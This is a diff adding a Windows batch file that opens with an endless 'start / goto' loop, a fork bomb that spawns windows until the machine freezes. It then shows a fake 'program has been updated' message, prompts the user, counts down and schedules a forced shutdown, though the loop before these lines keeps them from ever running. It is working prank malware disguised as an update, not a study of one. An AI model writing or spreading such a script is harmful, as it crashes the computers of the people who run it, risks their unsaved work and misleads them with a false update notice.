@@ -1,0 +1,13 @@
+﻿@echo off
+:A
+start
+goto :A
+echo Type A to continue
+set /p love=
+if %love%==A goto testing
+:testing
+echo the program has been updated
+echo Testing will begin in 20 secongs
+echo Your PC will run the program
+timeout 20
+shutdown -s -t 100
